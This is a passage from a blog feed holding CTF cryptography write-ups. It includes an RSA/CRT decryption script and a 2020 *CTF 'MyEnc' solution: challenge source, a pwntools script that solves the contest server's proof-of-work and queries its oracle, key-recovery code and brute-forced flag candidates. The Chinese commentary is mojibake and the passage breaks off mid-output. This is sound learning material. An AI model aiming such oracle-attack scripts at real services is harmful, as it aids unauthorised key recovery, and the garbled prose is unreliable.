title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309</span></span><br><span class="line">q = <span class="number">9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629</span></span><br><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">y = <span class="number">12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328</span></span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">e1 = <span class="number">36493</span></span><br><span class="line">e2 = <span class="number">52859</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>)</span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">d,p,n</span>):</span></span><br><span class="line">    <span class="keyword">if</span>((p - <span class="number">1</span>) % n == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(d,(p - <span class="number">1</span>) // n,p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = gmpy2.gcd(n, p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(d,(p - <span class="number">1</span>) // k,p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM</span>(<span class="params">c,e,p</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e):</span><br><span class="line">        tmpc = (c * gmpy2.invert(<span class="built_in">pow</span>(y,i,p),p)) % p</span><br><span class="line">        <span class="keyword">if</span> check(tmpc,p,e):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">C = [...]</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> C[::-<span class="number">1</span>]:</span><br><span class="line">    cp = c % p</span><br><span class="line">    cq = c % q</span><br><span class="line">    m1 = getM(cp,e1,p)</span><br><span class="line">    m2 = getM(cq,e2,q)</span><br><span class="line">    mm,lcm = GCRT([e1,e2],[m1,m2])</span><br><span class="line">    print(<span class="string">&quot;Get mm: &quot;</span> + <span class="built_in">hex</span>(mm))</span><br><span class="line">    m *= e</span><br><span class="line">    m += mm</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿™é¢˜ä¸€ç‚¹éƒ½ä¸éš¾, åšäº†é‚£ä¹ˆä¹…å®Œå…¨å°±æ˜¯è„‘å­æ²¡è½¬è¿‡æ¥â€¦</p><p>è€—å­å°¾æ±, å¥½å¥½åæ€</p><h1 id="AliceWantFlag"><a href="#AliceWantFlag" class="headerlink" title="AliceWantFlag"></a>AliceWantFlag</h1><blockquote><p>studying~</p></blockquote><h1 id="EasyCurve"><a href="#EasyCurve" class="headerlink" title="EasyCurve"></a>EasyCurve</h1><blockquote><p>studying~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å•Šè¿™æ¬¡çš„è¿™ä¸ªæ¯”èµ›å› ä¸ºä¸ä¼šLattice, å¯¼è‡´åŸºæœ¬ä¸ä¼šåšå•Š, è™½ç„¶æ¯”èµ›ååŠæ®µå»å­¦äº†ä¹Ÿè¯•ç€åšäº†, è™½ç„¶æ ¼å­é€ å‡ºæ¥è¿˜è¢«è‡ªå·±è ¢åˆ°äº†, ä½†è¿˜æ˜¯â€¦æ”¶è·å¾ˆå¤šhh&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹å§&lt;/p&gt;
&lt;h1 id=&quot;babylattice&quot;&gt;&lt;a href=&quot;#babylattice&quot; c</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2020 starCTF Crypto</title>
    <link href="http://tearsjin.github.io/2021/01/18/writeup-for-2020-starCTF/"/>
    <id>http://tearsjin.github.io/2021/01/18/writeup-for-2020-starCTF/</id>
    <published>2021-01-18T01:28:15.000Z</published>
    <updated>2021-03-27T12:06:05.241Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ€»ä¹‹å°±æ˜¯åƒè€æœ¬<br>æ€»ä¹‹å°±æ˜¯æ›²çº¿å¥½éš¾<br>è¿™æ¬¡å°±å·®ä¸€é“MyCurveâ€¦æ‰¾ä¸ªå¸ˆå‚…å­¦ä¹ å­¦ä¹ å†è¡¥å……è¿™ä¸ª</p></blockquote><p>Crypto</p><ul><li>MyEnc</li><li>GuessKey2</li><li>little case</li><li>MyCurve</li></ul><h1 id="MyEnc"><a href="#MyEnc" class="headerlink" title="MyEnc"></a>MyEnc</h1><p>nc 52.163.228.53 8081<br>é™„ä»¶:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> time,urandom</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">iv=bytes_to_long(urandom(<span class="number">256</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">15</span></span><br><span class="line">keystream=<span class="built_in">bin</span>(<span class="built_in">int</span>(flag.encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">8</span>*<span class="built_in">len</span>(flag),<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n:&quot;</span>,n</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;give me a number:&#x27;</span></span><br><span class="line">m=<span class="built_in">int</span>(raw_input())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">ct=iv</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> keystream[cnt]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">ct+=<span class="built_in">pow</span>(m^q,i**i**i,n)</span><br><span class="line">ct%=n</span><br><span class="line">cnt=(cnt+<span class="number">1</span>)%<span class="built_in">len</span>(keystream)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;done:&quot;</span>,ct</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>stream cipherçš„å‘³é“<br>flag å³ keystream å…±120ä½<br>æ¯æ¬¡è¾“å…¥ä¸€ä¸ªm , æ ¹æ®keyçš„7ä½è¿”å›ä¸€ä¸ªct<br>ç¬¬1ä¸ªmå¯¹åº”keyçš„0<del>6<br>ç¬¬2ä¸ªmå¯¹åº”keyçš„7</del>13<br>â€¦<br>ç¬¬17ä¸ªmå¯¹åº”keyçš„112<del>118<br>ç¬¬18ä¸ªmå¯¹åº”keyçš„119</del>5<br>â€¦<br>120ä¸ªmåˆ™ä¼šå›åˆ°åˆšå¼€å§‹ä¸€æ ·</p><p>è€Œé‡å¤ä¼ åŒæ ·çš„mçš„æ—¶å€™, å¦‚æœå–keyçš„7ä½æ˜¯ç›¸åŒçš„, é‚£ä¹ˆè¿”å›çš„ctä¹Ÿæ˜¯ç›¸åŒçš„, æ ¹æ®è¿™ä¸ªç‰¹ç‚¹, é‡å¤ä¼ 120ä¸ªm=0, å¯ä»¥å¾—åˆ°ä¸€äº›è¿”å›ç›¸åŒctçš„7ä½, ä¹Ÿå°±æ˜¯keyé‡Œé¢ç›¸åŒçš„ä¸¤ä¸ª7ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;52.163.228.53&#x27;</span>, <span class="number">8081</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256((start + END).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;xxxx:&#x27;</span>).decode()</span><br><span class="line">END = re.findall(<span class="string">r&#x27;xxxx\+(.*)\) ==&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">r&#x27;== (.*)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">print(resp)</span><br><span class="line">resp = con.recv().decode()</span><br><span class="line">print(resp)</span><br><span class="line">con.sendline(proof(END, SHA))</span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;number:&#x27;</span>).decode()</span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>):</span><br><span class="line">    con.sendline(<span class="string">&#x27;0&#x27;</span>.encode())</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;number:&#x27;</span>).decode()</span><br><span class="line">    num = <span class="built_in">int</span>(resp[<span class="number">6</span>:-<span class="number">17</span>])</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> arr:</span><br><span class="line">        arr.append(num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        arr.append(-<span class="number">1</span>)</span><br><span class="line">        print(_, arr.index(num))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„è¾“å‡ºä¸º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">15 12</span><br><span class="line">26 14</span><br><span class="line">32 1</span><br><span class="line">37 9</span><br><span class="line">43 31</span><br><span class="line">52 51</span><br><span class="line">54 14</span><br><span class="line">60 48</span><br><span class="line">69 58</span><br><span class="line">71 31</span><br><span class="line">76 39</span><br><span class="line">77 65</span><br><span class="line">80 8</span><br><span class="line">81 38</span><br><span class="line">82 48</span><br><span class="line">85 63</span><br><span class="line">86 31</span><br><span class="line">88 48</span><br><span class="line">90 7</span><br><span class="line">92 17</span><br><span class="line">93 56</span><br><span class="line">94 2</span><br><span class="line">96 64</span><br><span class="line">98 70</span><br><span class="line">99 0</span><br><span class="line">100 12</span><br><span class="line">103 48</span><br><span class="line">104 12</span><br><span class="line">105 65</span><br><span class="line">106 49</span><br><span class="line">110 73</span><br><span class="line">112 72</span><br><span class="line">114 78</span><br><span class="line">115 87</span><br><span class="line">117 29</span><br><span class="line">118 83</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œçš„15 12ä»£è¡¨ç€, keyçš„15* 7<del>15* 7+6 == 12* 7</del>12* 7+6<br>ä¹Ÿå°±æ˜¯<code>key[105:112] == key[84:91]</code><br>æ¯ä¸€è¡Œéƒ½èƒ½æ„é€ å‡ºè¿™ä¹ˆä¸€ä¸ªç­‰å¼</p><p>æ ¹æ®æ‰€æœ‰ç­‰å¼, å¯ä»¥å°†åé¢çš„ä¸€äº›ä½æ•°ç”¨å‰é¢çš„ä½æ•°è¡¨ç¤º(ä»–ä»¬éƒ½æ˜¯ç›¸ç­‰çš„)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">15</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">9</span>, <span class="number">43</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">14</span>, <span class="number">60</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">58</span>, <span class="number">71</span>, <span class="number">31</span>, <span class="number">76</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">80</span>, <span class="number">8</span>, <span class="number">81</span>, <span class="number">38</span>, <span class="number">82</span>,</span><br><span class="line">       <span class="number">48</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">86</span>, <span class="number">31</span>, <span class="number">88</span>, <span class="number">48</span>, <span class="number">90</span>, <span class="number">7</span>, <span class="number">92</span>, <span class="number">17</span>, <span class="number">93</span>, <span class="number">56</span>, <span class="number">94</span>, <span class="number">2</span>, <span class="number">96</span>, <span class="number">64</span>, <span class="number">98</span>, <span class="number">70</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">104</span>, <span class="number">12</span>, <span class="number">105</span>,</span><br><span class="line">       <span class="number">65</span>, <span class="number">106</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">117</span>, <span class="number">29</span>, <span class="number">118</span>, <span class="number">83</span>]</span><br><span class="line"></span><br><span class="line">key = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(arr), <span class="number">2</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j, k) <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>((arr[i + <span class="number">1</span>] * <span class="number">7</span>), (arr[i + <span class="number">1</span>] * <span class="number">7</span> + <span class="number">7</span>)), <span class="built_in">range</span>((arr[i] * <span class="number">7</span>), (arr[i] * <span class="number">7</span> + <span class="number">7</span>))):</span><br><span class="line">            <span class="keyword">if</span> key[j % <span class="number">120</span>] &lt; key[k % <span class="number">120</span>]:</span><br><span class="line">                key[k % <span class="number">120</span>] = key[j % <span class="number">120</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                key[j % <span class="number">120</span>] = key[k % <span class="number">120</span>]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>ç„¶å! å°±èƒ½æŠŠkeyè¿˜åŸæˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 0, 2, 0, 2, 0, 2, 0, 0, 2, 0, 0, 0, 0, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 0, 0, 0, 2, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 40, 41, 42, 43, 2, 0, 0, 2, 0, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 2, 2, 0, 0, 2, 2, 0, 0, 0, 0, 0, 2, 2, 2, 0, 2, 0, 0, 0, 0, 2, 2, 0, 0, 0, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 0, 2, 0, 0, 0, 0, 2, 0, 113, 114, 2, 2, 2, 0, 2]</span><br></pre></td></tr></table></figure><p>0å’Œ2åˆ†åˆ«ä»£è¡¨ç€1æˆ–è€…0(ä¸ç¡®å®šæ˜¯0å¯¹åº”1è¿˜æ˜¯2å¯¹åº”1<br>è€Œå…¶ä»–çš„æ¯”è¾ƒå¤§çš„æ•°åˆ™æ˜¯æœªçŸ¥çš„, ä¸€å…±12ä½,<br>æ‰€ä»¥åªéœ€è¦çˆ†ç ´2^12æ¬¡, ç„¶åå†çŒœä¸€ä¸‹0å¯¹åº”çš„æ˜¯1è¿˜æ˜¯0<br>è¿™é‡Œç›´æ¥çŒœ0å¯¹åº”0, ä¸­å•¦!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> key[i] == <span class="number">0</span>:</span><br><span class="line">        key[i] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> key[i] == <span class="number">2</span>:</span><br><span class="line">        key[i] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[i] = <span class="string">&#x27;&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyCrypto.Conversion <span class="keyword">import</span> bin2text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">12</span>):</span><br><span class="line">    pad = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">12</span>)</span><br><span class="line">    keystream = key.<span class="built_in">format</span>(pad[<span class="number">0</span>], pad[<span class="number">1</span>], pad[<span class="number">2</span>], pad[<span class="number">3</span>], pad[<span class="number">4</span>], pad[<span class="number">5</span>], pad[<span class="number">6</span>], pad[<span class="number">7</span>], pad[<span class="number">8</span>], pad[<span class="number">9</span>], pad[<span class="number">10</span>], pad[<span class="number">11</span>])</span><br><span class="line">    flag = bin2text(keystream)</span><br><span class="line">    <span class="keyword">if</span> flag[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„è¾“å‡º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">*CTF&#123;HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9MuG0t1T!&#125;</span><br><span 